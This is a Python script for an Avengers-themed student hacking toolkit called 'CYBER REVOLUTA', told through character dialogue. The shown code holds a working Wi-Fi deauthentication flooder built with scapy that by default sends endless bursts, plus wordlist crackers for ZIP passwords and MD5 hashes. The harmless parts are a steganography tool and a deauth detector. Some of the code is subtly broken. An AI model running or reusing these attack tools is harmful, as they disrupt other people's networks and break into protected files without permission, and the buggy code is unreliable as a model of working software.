#!/usr/bin/python3
import cv2
import ast
import signal
import hashlib
import zipfile
import pyfiglet
import requests
import numpy as num
from sys import exit
from scapy.all import *
from time import sleep
import colorama as color
import scapy.all as scapy
import tkinter.filedialog
from cfonts import render
from termcolor import colored
from bs4 import BeautifulSoup
from tqdm import tqdm, trange
from urllib.parse import urljoin
from time import sleep as timeout
from pyfiglet import figlet_format
from multiprocessing import Process
from pynput.keyboard import Listener
from PyPDF2 import PdfFileWriter, PdfFileReader
from scapy.layers.dot11 import Dot11Beacon, Dot11ProbeResp, Dot11, Dot11Deauth, Dot11Elt, Dot11AssoReq, Dot11Auth

red = '\033[31m'
green = '\033[32m'
orange = '\033[33m'
blue = '\033[34m'
yellow = '\033[93m'
white = '\033[37m'


def restart():
    start = sys.executable
    os.execl(start, start, *sys.argv)


def loading():
    print(green + "  Loading..............")

    animation = ["  [■□□□□□□□□□□□□□□□□]", "  [■■□□□□□□□□□□□□□□□]", "  [■■■□□□□□□□□□□□□□□]",
                 "  [■■■■□□□□□□□□□□□□□]",
                 "  [■■■■■□□□□□□□□□□□□]", "  [■■■■■■□□□□□□□□□□□]", "  [■■■■■■■□□□□□□□□□□]",
                 "  [■■■■■■■■□□□□□□□□□]",
                 "  [■■■■■■■■■□□□□□□□□]", "  [■■■■■■■■■■□□□□□□□]", "  [■■■■■■■■■■■□□□□□□]",
                 "  [■■■■■■■■■■■■□□□□□]",
                 "  [■■■■■■■■■■■■■□□□□]", "  [■■■■■■■■■■■■■■□□□]", "  [■■■■■■■■■■■■■■■□□]",
                 "  [■■■■■■■■■■■■■■■■□]",
                 "  [■■■■■■■■■■■■■■■■■]"]

    for i in range(len(animation)):
        time.sleep(0.3)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()


def cre(sentence):
    for word in sentence:
        print(word, end='', flush=True)
        timeout(0.040)
    print()


def credits():
    os.system('clear')
    # print('\n')
    cre(
        white + "\n\n\t\t\t\t\t\t\t\tARYA DAVIDSON A        : MISCHIEF - STEGANOGRAPHY"
                "\n\n\t\t\t\t\t\t\t\tARUN V BABU            : HAWKEYE - WIFI DE_AUTHENTICATION"
                "\n\n\t\t\t\t\t\t\t\tSREEHARI NS            : STARLORD - ZIP CRACKER"
                "\n\n\t\t\t\t\t\t\t\tARJUN CK AND SAKETH TK : GROOT - MD5 HASHING AND DE_HASHING"
                "\n\n\t\t\t\t\t\t\t\tGOUTHAMAN KR           : DRAX - XSS AND SUBDOMAIN SCANNER"
                "\n\n\t\t\t\t\t\t\t\tARJUN AR NAIR          : FALCON - DNS_INFO_TRACKER"
                "\n\n\t\t\t\t\t\t\t\tCIVIC V CHACKO         : WITCHER - APR_SPOOFER"
                "\n\n\t\t\t\t\t\t\t\tMOHAMMED ANAS          : TINY SOLDIER - KEY_LOGGER"
                "\n\n\t\t\t\t\t\t\t\tJOBSON SAJAN           : STRANGE - IP_SPOOFER"
                "\n\n\t\t\t\t\t\t\t\tRICHARD THOMAS         : SIDEKICK - PDF CRACKER"
                "\n\n\t\t\t\t\t\t\t\tPRESENTATION           : ARJUN AR NAIR"
                "\n\n\t\t\t\t\t\t\t\tSOURCECODE MERGING     : ARYA DAVIDSON A"
                "\n\n\t\t\t\t\t\t\t\tEDITING AND DEBUGGING  : ARUN V BABU"
                "\n\t\t\t\t\t\t\t\t                         ARYA DAVIDSON A"
                "\n\t\t\t\t\t\t\t\t                         ARJUN AR NAIR"
                "\n\t\t\t\t\t\t\t\t                         CIVIC V CHACKO"
                "\n\n\t\t\t\t\t\t\t\tSUPPORTING TEAM        : SREEHARI NS"
                "\n\t\t\t\t\t\t\t\t                         RICHARD THOMAS"
                "\n\t\t\t\t\t\t\t\t                         JOBSON SAJAN"
                "\n\t\t\t\t\t\t\t\t                         GOWTHAMAN KR"
                "\n\n\t\t\t\t\t\t\t\tDOCUMENTATION          : CIVIC V CHACKO"
                "\n\t\t\t\t\t\t\t\t                         MOHAMMED ANAS"
                "\n\n\t\t\t\t\t\t\t\tVIDEO EDITING          : RICHARD THOMAS")

def end():
    os.system('clear')
    print("\n\n\n\n")
    speed(render("THE END", colors=['white', 'black'], align='center'))
    time.sleep(0.00001)
    input("")
def timming(sentence):
    for word in sentence:
        print(word, end='', flush=True)
        timeout(0.01)
    print()


def speed(sentence):
    for word in sentence:
        print(word, end='', flush=True)
        timeout(0.0001)
    print()


os.system('clear')
print("\n\n\n\n")
speed(render("CYBER REVOLUTA", colors=['white', 'red'], align='center'))
time.sleep(0.00001)
input("")
os.system('clear')
print("\n\n\n\n\n")
head = "DISCLAIMER\n"
message = "Any malicious activities performed by this tool is the sole responsibility of the user itself.\n"
message1 = " The author of this tool doesn't intend to use the tool in any malicious manner.\n"
x = head.center(170, " ")
y = message.center(170, " ")
z = message1.center(95, " ")
timming(x)
timming(y + z)
input("")
os.system('clear')
print("\n\n\n\n")
speed(render("Mafiaboy's Attack 2000", colors=['white', 'black'], align='center'))
time.sleep(0.00001)
input("")
os.system('clear')


def no():
    for i in range(2001, 2017):
        os.system('clear')
        output = render(str(i), colors=['white', 'white'], align='center')
        print("\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", output)
        time.sleep(.3)


no()
input("")
os.system('clear')
print("\n\n\n\n")
speed(render("Wanna Cry Attack 2017", colors=['white', 'white'], align='center'))
time.sleep(0.00001)
input("")


def no_1():
    for i in range(2018, 2019):
        os.system('clear')
        output = render(str(i), colors=['white', 'white'], align='center')
        print("\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", output)
        time.sleep(.3)


no_1()
input("")
os.system('clear')
print("\n\n\n\n")
speed(render("Capital One Breach 2019", colors=['white', 'white'], align='center'))
time.sleep(0.00001)
input("")


def no():
    for i in range(2020, 2050):
        os.system('clear')
        output = render(str(i), colors=['white', 'white'], align='center')
        print("\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", output)
        time.sleep(.2)


no()
input("")
os.system('clear')
for i in range(100):
    os.system('clear')
    output = render("Now we are in 2050", colors=['white', 'white'], align='center')
    print("\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", output)
    time.sleep(.01)
    os.system('clear')
print("\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n", "\n",
      render("Now we are in 2050", colors=['white', 'white'], align='center'))
input("")
os.system('clear')
timming(green + "\n\n\n\n   Thor : Hey, Fury I got your electronic mail, I'm here for you. Why did you call me?")
input("")
timming(
    "   Furi : I try to bring together a group of remarkable people. I thought you could not read that encrypted message. How did you make it possible.")
input("")
timming("   Thor : No No No !!! Not me, he did it, meet my brother Loki. He can easily hide and retrieve things.")
input("")
timming("   Furi : So Loki you are a genius. I'm Nick Furi, let me know how you did that.")
input("")
os.system('clear')


def loki_banner():
    os.system("clear")
    timming(colored(figlet_format("   MISCHIEF", font="slant", ), color='red'))
    timming(blue + "      =========== " + "LOKI : GOD OF MISCHIEF" + " ===========")
    print("")


def loki_banner1():
    print(colored(figlet_format("   MISCHIEF", font="slant", ), color='red'))
    print(blue + "      =========== " + "LOKI : GOD OF MISCHIEF" + " ===========")
    print("")
    print(green +
          "\n      You know it's a wonderful and tremendous"
          "\n      idea,lets steal the biggest and the most"
          "\n      obvious ship in the universe and escape"
          "\n      in that."
          "\n      Remember me? I'm LOKI,Prince of Asgard!!"
          "\n      And I am going to bless you to hide your"
          "\n      secrets!!!! ")
    print()


def loki_intro():
    loki_banner()
    timeout(2)
    timming(green +
            "\n      You know it's a wonderful and tremendous"
            "\n      idea,lets steal the biggest and the most"
            "\n      obvious ship in the universe and escape"
            "\n      in that."
            "\n      Remember me? I'm LOKI,Prince of Asgard!!"
            "\n      And I am going to bless you to hide your"
            "\n      secrets!!!! ")
    print()
    loki_2()


def en_loki_type_intro():
    os.system('clear')
    print(red + figlet_format('      MISCHIEF\n   ENCRYPTION', font='slant'))
    timeout(1)
    timming(
        yellow + "  It's not how well you play the game, it's deciding what game you"
                 "\n  want to play!!! ")
    print()
    timming(green + "  [ Please select the cover image from the directory!!! ]")
    timeout(2)


def next_():
    print(blue + "  [0] Back\n  [1] Exit\n  [2] Main Menu")
    try:
        choice = input("  Enter your choice : ")
        if choice == '0':
            os.system("clear")
            print(red + figlet_format('      MISCHIEF\n   ENCRYPTION', font='slant'))
            loki_4()
            loki_3()
        elif choice == '1':
            quit()
        elif choice == '2':
            os.system("clear")
            print(red + figlet_format('     WELCOME\n   TO  ASGARD', font='slant'))
            loki_1()
            loki_3()
        else:
            os.system("clear")
            print(red + figlet_format('     WELCOME\n   TO  ASGARD', font='slant'))
            loki_1()
            loki_3()
    except ValueError:
        print("done")


def after_loki():
    os.system('clear')
    timming(green + "\n\n\n\n   Furi : This is awesome, where did you learn this from!!! ")
    input("")
    timming(
        "   Loki : I learned this from another world, it's better to know yourself than to explain. In the absence of Heimdall, I can send you there with this byFrost!!!")
    input("")
    os.system("clear")
    timming(
        "\n\n\n\n\n\n\n\n\n\t\t\t       Loki sent them to the most dangerous world, pretending to take them to the land where he has learnt his skills. ")
    input("")
    os.system("clear")
    timming("\n\n\n\n   Furi : where are we? ")
    input("")
    timming("   Thor : We can't trust him completely. Cheating is another of his skills. I think we are trapped here.")
    input("")
    timming("   Black Widow : Hi guys !! This is a pleasant surprise. How did you get here?")
    input("")
    timming("   Furi : Loki tricked on us.")
    input("")
    timming("   Black Widow : Same happened to us.")
    input("")
    timming("   Furi : Oh really!! hey, what you meant by us.")
    input("")
    timming(
        "   Hawkeye : Here we have friends with unique skills and together we try to escape from this dangerous world. Are you joining us?")
    input("")
    timming("   Thor : Wait a sec!!! Who are you ?")
    input("")
    os.system('clear')
    hawkeye_intro()


def loki_1():
    timming(
        yellow + "   Here,My thoughts entirely depends on the rest of the information"
                 "\n   you're about to give me!!! ")
    print()
    timeout(1)
    print(green + "   [1] Encode \n   [2] Decode \n   [3] Next Tool \n   [0] Back")


def loki_2():
    print(red + "      >>>> [ Press enter to hide your secrets ]")
    input('      >>>> ')
    os.system("clear")
    print(red + figlet_format('     WELCOME\n   TO  ASGARD', font='slant'))
    loki_1()
    loki_3()


def loki_4():
    timming(yellow +
            "   Everything's a choice!!! Nobody's born good!!! Nobody's born evil!!!"
            "\n   It's always a choice!!! ")
    print()
    timeout(1)
    print(green + "   [1] Hide single image\n   [2] Hide double image\n   [3] Hide camera image\n   [0] back")


def loki_3():
    # while True:
    try:
        Choice = input("   Enter your choice here : ")
        if Choice == '1':
            os.system('clear')

            print(red + figlet_format('      MISCHIEF\n  ENCRYPTION', font='slant'))

            loki_4()
            try:
                Type = int(input("   Enter your choice here : "))
                if Type == 1:
                    en_loki_type_intro()

                    filename = tkinter.filedialog.askopenfilename(
                        initialdir='/root', title='MISCHIEF ENCRYPTION',
                        filetypes=[("Jpeg Images", "*.jpeg"), ('Png Images', '*.png'), ("Jpg Image", "*.jpg")])
                    image1 = cv2.imread(filename, 1)

                    timming(green + "  [ Please select the secret image from the directory!!! ]")
                    timeout(2)
                    filename1 = tkinter.filedialog.askopenfilename(
                        initialdir='/root', title='MISCHIEF ENCRYPTION',
                        filetypes=[("Jpeg Images", "*.jpeg"), ('Png Images', '*.png'), ("Jpg Image", "*.jpg")])
                    image2 = cv2.imread(filename1, 1)
                    width = image1.shape[1]
                    height = image2.shape[0]
                    area = (width, height)
                    im1 = cv2.resize(image1, area)
                    im2 = cv2.resize(image2, area)
                    for valu in range(height):
                        for valu1 in range(width):
                            for valu2 in range(3):
                                pixel1 = format(im1[valu][valu1][valu2], '08b')
                                pixel2 = format(im2[valu][valu1][valu2], '08b')
                                pix1 = pixel1[:4] + pixel2[:4]
                                im1[valu][valu1][valu2] = int(pix1, 2)
                    cv2.imwrite('kneel.png', im1)
                    print("\n")
                    loading()
                    print("\n")
                    print(red + "   -----------------------------------------")
                    timming("  | In the end!!! You always kneel.png!!!   |")
                    print("   -----------------------------------------")
                    print(" ")
                    next_()





                elif Type == 2:
                    en_loki_type_intro()
                    filename = tkinter.filedialog.askopenfilename(
                        initialdir='/root', title='MISCHIEF ENCRYPTION',
                        filetypes=[("Jpeg Images", "*.jpeg"), ('Png Images', '*.png'), ("Jpg Image", "*.jpg")])
                    image1 = cv2.imread(filename, 1)
                    timming(green + "  [ Please select the cover/secret image from the directory!!! ]")
                    timeout(2)
                    filename1 = tkinter.filedialog.askopenfilename(
                        initialdir='/root', title='MISCHIEF ENCRYPTION',
                        filetypes=[("Jpeg Images", "*.jpeg"), ('Png Images', '*.png'), ("Jpg Images", "*.jpg")])
                    image2 = cv2.imread(filename1, 1)
                    timming(green + "  [ Please select the secret image from the directory!!! ]")
                    timeout(2)
                    filename2 = tkinter.filedialog.askopenfilename(
                        initialdir='/root', title='MISCHIEF ENCRYPTION',
                        filetypes=[("Jpeg Images", "*.jpeg"), ('Png Images', '*.png'), ("Jpg Images", "*.jpg")])
                    image3 = cv2.imread(filename2, 1)
                    width = image1.shape[1]
                    height = image2.shape[0]

                    def lsb():
                        area = (width, height)
                        im1 = cv2.resize(image1, area)
                        im2 = cv2.resize(image2, area)
                        for valu in range(height):
                            for valu1 in range(width):
                                for valu2 in range(3):
                                    pixel1 = format(im1[valu][valu1][valu2], '08b')
                                    pixel2 = format(im2[valu][valu1][valu2], '08b')
                                    pix1 = pixel1[:4] + pixel2[:4]
                                    im1[valu][valu1][valu2] = int(pix1, 2)
                        cv2.imwrite('kneel.png', im1)

                    def lsb1():
                        area = (width, height)
                        im2 = cv2.resize(image2, area)
                        im3 = cv2.resize(image3, area)
                        for value in range(height):
                            for value1 in range(width):
                                for value2 in range(3):
                                    pixel2 = format(im2[value][value1][value2], '08b')
                                    pixel3 = format(im3[value][value1][value2], '08b')
                                    pix2 = pixel2[:4] + pixel3[:4]
                                    im2[value][value1][value2] = int(pix2, 2)
                        cv2.imwrite('loki.png', im2)

                    lsb()
                    lsb1()
                    print("\n")
                    loading()
                    print("\n")
                    print(red + "   ------------------------------------------------------")
                    timming("  | In the end!!! You always kneel.png and loki.png!!!   |")
                    print("   ------------------------------------------------------")
                    print(" ")
                    next_()


                elif Type == 3:
                    en_loki_type_intro()
                    filename = tkinter.filedialog.askopenfilename(
                        initialdir='/root', title='MISCHIEF ENCRYPTION',
                        filetypes=[("Jpeg Images", "*.jpeg"), ('Png Images', '*.png'), ("Jpg Images", "*.jpg")])
                    image1 = cv2.imread(filename, 1)
                    camera = cv2.VideoCapture(0)
                    ret, frame = camera.read()
                    cv2.imwrite("evil.png", frame)
                    cv2.destroyAllWindows()
                    timming("  [ The secret image [camera image] : You always evil.png!!! ]")
                    image2 = cv2.imread('evil.png', 1)
                    width = 750
                    height = 750
                    area = (width, height)
                    im1 = cv2.resize(image1, area)
                    im2 = cv2.resize(image2, area)
                    for valu in range(height):
                        for valu1 in range(width):
                            for valu2 in range(3):
                                pixel1 = format(im1[valu][valu1][valu2], '08b')
                                pixel2 = format(im2[valu][valu1][valu2], '08b')
                                pix1 = pixel1[:4] + pixel2[:4]
                                im1[valu][valu1][valu2] = int(pix1, 2)
                    cv2.imwrite('kneel.png', im1)
                    print("\n")
                    loading()
                    print("\n")
                    print(red + "   -----------------------------------------")
                    timming("  | In the end!!! You always kneel.png!!!   |")
                    print("   -----------------------------------------")
                    print(" ")
                    next_()


                elif Type == 0:
                    os.system("clear")
                    print(red + figlet_format('     WELCOME\n   TO  ASGARD', font='slant'))
                    loki_1()
                    loki_3()
                else:
                    os.system("clear")
                    print(red + figlet_format('      MISCHIEF\n   ENCRYPTION', font='slant'))
                    loki_4()
                    loki_3()
                print("")



            except ValueError:
                os.system("clear")
                print(red + figlet_format('       MISCHIEF\n   ENCRYPTION', font='slant'))
                loki_4()
                loki_3()



        elif Choice == '2':
            os.system('clear')
            print(red + figlet_format('      MISCHIEF\n  DECRYPTION', font='slant'))
            timming(yellow + "  Hitting does not solve everything!!!")
            print()
            timming(green + "  [ Please select the cover image from the directory!!! ]")
            timeout(2)
            filename = tkinter.filedialog.askopenfilename(
                initialdir='/root', title='MISCHIEF DECRYPTION',
                filetypes=[('Png Images', '*.png'), ("Jpeg Images", "*.jpeg"), ("Jpg Images", "*.jpg")])
            img = cv2.imread(filename, 1)
            width, height = img.shape[0], img.shape[1]

            saved2img = num.zeros((width, height, 3), num.uint8)
            for value in range(width):
                for value1 in range(height):
                    for value2 in range(3):
                        bin_data = format(img[value][value1][value2], '08b')
                        converted_bin = bin_data[4:] + chr(random.randint(0, 1) + 48) * 4
                        saved2img[value][value1][value2] = int(converted_bin, 2)
            cv2.imwrite('king.png', saved2img)
            print("\n")
            loading()
            print("\n")
            timming(red + "   -----------------------------------------")
            timming("  | In the end!!! You always king.png!!!    |")
            timming("   -----------------------------------------")
            print(" ")
            print(blue + "  [0] Back\n  [1] Exit\n")
            try:
                choice = input("  Enter your choice : ")
                if choice == '0':
                    os.system("clear")
                    print(red + figlet_format('     WELCOME\n   TO  ASGARD', font='slant'))
                    loki_1()
                    loki_3()
                elif choice == '1':
                    quit()


                else:
                    os.system("clear")
                    print(red + figlet_format('     WELCOME\n   TO  ASGARD', font='slant'))
                    loki_1()
                    loki_3()
            except ValueError:
                print("done")



        elif Choice == '3':
            print()
            os.system("clear")
            after_loki()



        elif Choice == 0:
            print()
            os.system("clear")
            loki_intro()


        else:
            os.system("clear")
            print(colored(figlet_format("   MISCHIEF", font="slant", ), color='red'))
            print(blue + "      =========== " + "LOKI : GOD OF MISCHIEF" + " ===========")
            print("")
            loki_2()
    except ValueError:
        os.system("clear")
        print("done")


def hawkeye_banner():
    timming(red + pyfiglet.figlet_format(" HAWKEYE", font="slant"))
    print(blue + "   ================ " + "Clint Barton" + " ================")


def hawkeye_intro():
    os.system("clear")
    hawkeye_banner()
    timming(
        green + "\n   The city is flying, we’re fighting an army of"
                "\n   robots,  and I have a bow and arrow. None of "
                "\n   this makes sense!!!"
                "\n   I'm Clint Barton!!! I can connect an evil to"
                "\n   an access point.")
    input(blue + '\n   [ Please press enter to move forward ] ')
    hawkeye()


def hawkeye():
    os.system("clear")
    print(red + pyfiglet.figlet_format(" HAWKEYE", font="slant"))
    timming(yellow + "   Hawkeye :  I've done the whole mind control thing!!!")
    timming("   Before using this tool, you must enable monitor mode"
            "\n   on your wifi adapter.")
    option = input(
        green + "\n\t[1] WiFi Deauth Tool \n\t[2] WiFi Deauth Detection Tool\n\t[3] Next tool\n\t[0] Back"
                "\n\n\tEnter your choice: ")

    if option == '1':
        a = platform.system()
        if a == 'Windows':
            print(os.system('cls'))
        elif a == 'Linux':
            print(os.system('clear'))
        elif a == 'Darwin':
            print(os.system('clear'))

        print(colored(figlet_format("W!F! Deauth"), color="blue"))

        def add_network(pckt, known_networks):

            essid = pckt[Dot11Elt].info if '\x00' not in pckt[Dot11Elt].info and pckt[
                Dot11Elt].info != '' else 'Hidden SSID'
            bssid = pckt[Dot11].addr3
            channel = int(ord(pckt[Dot11Elt:3].info))
            if bssid not in known_networks:
                known_networks[bssid] = (essid, channel)
                print("{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid))

        def channel_scan():

            while True:
                try:
                    channel = random.randrange(1, 13)
                    os.system("iwconfig %s channel %d" % (interface, channel))
                    time.sleep(1)
                except KeyboardInterrupt:
                    break

        def stop_channel_scan():
            global stop_sniff
            stop_sniff = True
            channel_scan.terminate()
            channel_scan.join()

        def keep_sniffing():
            return stop_sniff

        def perform_deauth(bssid, client, count):
            pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
            cli_to_ap_pckt = None
            if client != 'FF:FF:FF:FF:FF:FF': cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client,
                                                                     addr3=bssid) / Dot11Deauth()
            print('Sending Deauth to ' + client + ' from ' + bssid)
            if not count: print('Press CTRL+C to quit')
            # We will do like aireplay does and send the packets in bursts of 64, then sleep for half a sec or so
            while count != 0:
                try:
                    for i in range(64):
                        # Send out deauth from the AP
                        send(pckt)
                        # If we're targeting a client, we will also spoof deauth from the client to the AP
                        if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt)
                    # If count was -1, this will be an infinite loop
                    count -= 1
                except KeyboardInterrupt:
                    break

        if __name__ == "__main__":
            # parser = argparse.ArgumentParser(
            #    description='aircommand.py - Utilize many wireless security features using the Scapy python module')
            # parser.add_argument('-i', '--interface', dest='interface', type=str, required=True,
            #                    help='Interface to use for sniffing and packet injection')
            # args = parser.parse_args()
            interface: str = input("Enter the wifi interface(ex.mon0) : ")
            try:
                if interface == 'wlan0' or interface == 'wlan1':
                    conf.iface = interface
                    networks = {}
                    stop_sniff = False
                    print('>>Press Ctrl+c to stop sniffing!<<')

                    bla = "Scanning wifi networks"

                    for i in tqdm(range(100), desc=bla):
                        sleep(0.1)

                    print('=' * 60 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel', 'ESSID', 'BSSID') + '=' * 60)
                    channel_scan = Process(target=channel_scan(), args=(interface,))
                    channel_scan.start()
                    signal.signal(signal.SIGINT, stop_channel_scan())
                    # Sniff Beacon and Probe Response frames to extract AP info
                    sniff(lfilter=lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)),
                          stop_filter=keep_sniffing,
                          prn=lambda x: add_network(x, networks))
                    # Reset our signal handler
                    signal.signal(signal.SIGINT, signal.SIG_DFL)
                    print('=' * 60)
                    target_bssid = input('Enter a BSSID to perform  deauth attack (q to quit): ')
                    while target_bssid not in networks:
                        if target_bssid == 'q': sys.exit(0)
                        input('BSSID not found... Please enter a valid BSSID (q to quit): ')
                    # Get our interface to the correct channel
                    print('Changing ' + interface + ' to channel ' + str(networks[target_bssid][1]))
                    os.system("iwconfig %s channel %d" % (interface, networks[target_bssid][1]))
                    # Now we have a bssid that we have detected, let's get the client MAC Address
                    target_client = input('Enter a client MAC address (Default: FF:FF:FF:FF:FF:FF): ')
                    if not target_client:
                        target_client = 'FF:FF:FF:FF:FF:FF'
                    deauth_pckt_count = input('Number of deauth packets (Default: -1 [constant]): ')
                    if not deauth_pckt_count:
                        deauth_pckt_count = -1

                    perform_deauth(target_bssid, target_client, deauth_pckt_count)
                else:
                    ValueError('dilogue')
            except ValueError:
                os.system('clear')  # clear

    if option == '2':
        a = platform.system()
        if a == 'Windows':
            print(os.system('cls'))
        elif a == 'Linux':
            print(os.system('clear'))
        elif a == 'Darwin':
            print(os.system('clear'))

        print(colored(figlet_format("Deauth Detector"), color="blue"))

        interface = input("Enter the wifi interface(ex.mon0) : ")  # str("Enter wifi interface (ex.mon0) : ")

        def sniffReq(p):
            if p.haslayer(Dot11Deauth):
                # Look for a deauth packet and print the AP BSSID, Client BSSID and the reason for the deauth.
                print(
                    p.sprintf(
                        "Deauth Found from AP [%Dot11.addr2%] Client [%Dot11.addr1%], Reason [%Dot11Deauth.reason%]"))
            # Look for an association request packet and print the Station BSSID, Client BSSID, AP info.
            if p.haslayer(Dot11AssoReq):
                print(
                    p.sprintf(
                        "Association request from Station [%Dot11.addr1%], Client [%Dot11.addr2%], AP [%Dot11Elt.info%]"))
                # Look for an authentication packet and print the Client and AP BSSID
            if p.haslayer(Dot11Auth):
                print(
                    p.sprintf("Authentication Request from [%Dot11.addr1%] to AP [%Dot11.addr2%]"))
                print(
                    p.sprintf(
                        "------------------------------------------------------------------------------------------"))

        sniff(iface=interface, prn=sniffReq)



    elif option == '3':
        os.system("clear")
        after_hawkeye()



    elif option == '0':
        os.system("clear")
        hawkeye_intro()


    else:
        os.system("clear")
        hawkeye()
    print()


def after_hawkeye():
    os.system("clear")
    timming(green + "\n\n\n\n   Hawkeye : He is the next person!!!")
    input("")
    timming("   Nick : Hey!!! I'm Nick Furi!!!")
    input("")
    os.system("clear")
    starlord_banner()
    starlord()


def starlord_banner():
    os.system("clear")
    timming(colored(figlet_format("   STARLORD", font="slant", ), color='red'))
    print(blue + "       ================== " + "Peter Quill" + " ==================\n")
    timming(
        green + "       Hey,you know what, there's another name you might"
                "\n       know me by. Star-lord!!!"
                "\n       legendary out law : you got me right?\n")
    input(blue + '       >>>> [ Please press enter to move forward ] ')


def starlord():
    def decode():
        os.system("clear")
        print(colored(figlet_format(" STARLORD    ZIP CRACKER", font="slant", ), color='blue'))
        zip_file = input(green + " [**] zipfile (/root/Desktop/eg.zip): ")
        if os.path.isfile(zip_file):
            passlist = input(' [**] wordlist (/root/Desktop/eg.txt: ')
            if os.path.isfile(passlist):

                os.system("clear")
                print(colored(figlet_format(" STARLORD    ZIP CRACKER", font="slant", ), color='blue'))
                loading()
                print("\n")
                count = 1
                with open(passlist, 'rb') as text:
                    for entry in text.readlines():
                        password = entry.strip()
                        try:
                            with zipfile.ZipFile(zip_file, 'r') as zf:
                                zf.extractall(pwd=password)
                                data = zf.namelist()[0]

                                data_size = zf.getinfo(data).file_size

                                def showprint():
                                    for c in '\n':
                                        sys.stdout.write(c)
                                        sys.stdout.flush()
                                        timeout(0.3)

                                showprint()

                            print(green +
                                  '''============================================================\n[-][-]PASSWORD FOUND ========>  %s\n ~%s\n ~%s\n============================================================''' % (
                                      password.decode('utf8'), data, data_size))

                            input(red + "\nPress enter to Main Menu!!!")
                            zip()

                        except:
                            number = count
                        print(red + '[%s] [-] Password failed! - %s' % (number, password.decode('utf8')))
                        count += 1
                        pass

                zip()


            else:
                print(red + "\n[!] File doesn't Exist. Please check the file's Path.")
                input("Press enter to restart!!!")
                timeout(0.1)
                decode()
        else:
            print(red + "\n[!] File doesn't Exist. Please check the file's Path.")
            input("Press enter to restart!!!")
            timeout(0.1)
            decode()

    def encode():
        os.system("clear")
        print(colored(figlet_format(" STARLORD    ZIP CRACKER", font="slant", ), color='blue'))
        file = input(green + " [**] File (/root/Desktop/*filename): ")
        try:
            if os.path.isfile(file):
                ps = input(" [**] Set Password: ")
                print(
                    yellow + "\n StarLord : You only need to enter the filename,"
                             "\n I'll add the '.zip' extension to your file!!\n")
                new_zip = input(green + " [**] Write (/root/Desktop/*filename): ")

                subprocess.call(['7z', 'a', '-p' + ps, '-y', new_zip + ".zip"] + [file, ])
                input(red + "\n Press enter to Main Menu!!!")
                zip()


            else:
                print(color.Fore.RED)
                print("[!] File doesn't Exist. Please check the file's Path.")
                input("Press enter to restart!!!")
                timeout(0.1)
                encode()
        except ValueError:
            print("[!] File doesn't Exist. Please check the file's Path.")
            input("Press enter to restart!!!")
            timeout(0.1)
            encode()
        zip()

    # starlord_banner()
    def zip():
        os.system("clear")
        print(colored(figlet_format("      STARLORD        ZIP CRACKER", font="slant", ), color='blue'))
        print(yellow + "       And am here because I'm just a junker man,I'll just break"
                       "\n       things for you!!!\n")
        print(green + "       [1] Encode\n       [2] Decode\n       [3] Next tool\n       [0] Back")
        option = input("       Enter the choice : ")
        if option == '1':
            encode()
        elif option == '2':
            decode()
        elif option == '3':
            after_starlord()
        elif option == '0':
            starlord_banner()
            zip()
        else:
            print("      KeyboardInterrupt... Press enter to restart!!!")
            zip()

    zip()


def after_starlord():
    os.system("clear")
    timming("\n\n\n\n   Starlord :  Meet my little friend Tree!!!")
    input("")
    os.system("clear")
    groot_main()


def groot_banner():
    os.system("clear")
    timming(colored(figlet_format("  GROOT", font="slant", ), color='red'))
    timming(blue + "     ===============================\n")
    timming(
        green + "     I'm Groot!!!"
                "\n     I'm Groot [I can digest your secrets]\n")
    input(blue + '     Please press enter to move forward ')


char = re.compile(r'[a-zA-Z0-9()!#$%^&*.,+=_-]')


def groot_hash():
    try:
        pwd = input(green + '\n' + '   Enter a Plain Text Password : ')
    except KeyboardInterrupt:
        sys.exit(0)
    else:
        if len(pwd) > 64:
            print('  Password must be between 1 and 64 characters. Try again.')
            groot_hash()
        else:
            if (char.match(pwd)):
                pwdUtf8 = pwd.encode("utf-8")
                hash = hashlib.md5(pwdUtf8)
                hexa = hash.hexdigest()
                print('\n' + '   Your MD5 Hash is: ' + (hexa))
            else:
                print('   Illegal characters. Try again.')
                groot_hash()


def groot_dhash():
    pass_hash = input(green + "    Enter your md5 hash here : ")
    try:
        pfile = input(green + "    Enter the path of wordlist(eg.txt) : ")
        pass_file = open(pfile, "r")
    except:
        print(red + "\n    No file found, enter currect path")
        input(blue + "\n    Press enter to Main menu!!!")
        os.system('clear')
        groot_main()

    for word in pass_file:

        enc_wrd = word.encode('   utf-8')
        digest = hashlib.md5(enc_wrd.strip()).hexdigest()
        print(word)
        print(digest)
        print(pass_hash)
        if digest.strip() == pass_hash.strip():
            print(green + "\n   =============================")
            print(red + "   [**] password found")
            print("   [**] password is :", word)
            print(green + "   =============================")
            flag = 1
            break

    if flag == 0:
        print("passwords not in list")


def groot_main():
    groot_banner()
    os.system('clear')
    print(colored(figlet_format("  GROOT", font='slant'), color="red"))
    print(green + "     [1] Md5 Hashing\n     [2] Md5 D-hashing\n     [3] Next tool\n     [0] Back\n")
    choice = input("     Enter your choice : ")

    if choice == "1":
        os.system('clear')
        print(colored(figlet_format("  GROOT", font='slant'), color="red"))
        groot_hash()
        input(blue + "\n   Press enter to Main menu!!!")
        os.system('clear')
        groot_main()


    elif choice == "2":
        os.system('clear')
        print(colored(figlet_format("  GROOT", font='slant'), color="red"))
        groot_dhash()
        input(blue + "\n   Press enter to Main menu!!!")
        os.system('clear')
        groot_main()


    elif choice == '3':
        os.system('clear')
        after_groot()
        drax_banner()
        drax_main()



    elif choice == '0':
        os.system('clear')
        groot_banner()
        os.system('clear')
        groot_main()
    else:
        os.system('clear')
        groot_main()


def after_groot():
    os.system("clear")
    timming(green + "\n\n\n\n   StarLord : Meet Our new friend!!!")
    input("")
    os.system("clear")



def drax_banner():
    os.system("clear")
    timming(colored(figlet_format("     DRAX", font="slant"), color='red'))
